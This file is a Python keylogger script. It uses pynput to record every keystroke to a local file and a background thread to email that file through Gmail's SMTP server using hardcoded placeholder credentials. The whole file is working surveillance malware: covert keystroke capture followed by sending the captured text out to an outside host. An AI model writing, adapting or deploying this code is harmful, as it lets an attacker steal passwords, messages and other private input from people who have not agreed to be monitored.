import time
import threading
from pynput import keyboard
from datetime import datetime
import smtplib, ssl
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication


def send_email():   
   SUBJECT = f"Archivo info {date}"
   
   msg = MIMEMultipart()
   msg['Subject'] = SUBJECT 
   msg['From'] = 'test@gmail.com'
   msg['To'] = 'test@gmail.com'
   
   with open('data.txt', "rb") as attachment:
      p = MIMEApplication(attachment.read(), _subtype="txt")
      p.add_header('Content-Disposition', 'attachment; filename="data.txt"')
      msg.attach(p)
      
   context = ssl.create_default_context()
   
   smtp_server = 'smtp.gmail.com'
   smtp_port = 587
   with smtplib.SMTP(smtp_server, smtp_port) as server:
      server.ehlo()
      server.starttls(context=context)
      server.ehlo()
      server.login('test@gmail.com', 'admin1234')
      server.sendmail('test@gmail.com', 'test@gmail.com', msg.as_string())
      server.quit()


def loop_mail():
      start = time.time()
      print(start)
      while True:
         end = time.time()
         if int(end - start) == 60:
                send_email()
         time.sleep(1)

threading.Thread(target=loop_mail).start()


global date
date = datetime.now().strftime("%Y-%m-%d: %H:%M")
print(date)


with open("data.txt", "w") as f:
    f.write(f"{date}\n")

    
#send_email()
def on_press(key):
   print(key)
   try:
      with open("data.txt", "a") as f:
         f.write(key.char)
   except Exception as e:
      key = str(key)
      with open("data.txt", "a") as f:
         if key == 'Key.space':
            key = ' '
         elif key == 'Key.enter':
            key = "\n"
         else:       
            key = f"||{key}||"
            
         f.write(key)


with keyboard.Listener(on_press=on_press) as listener:
   listener.join()
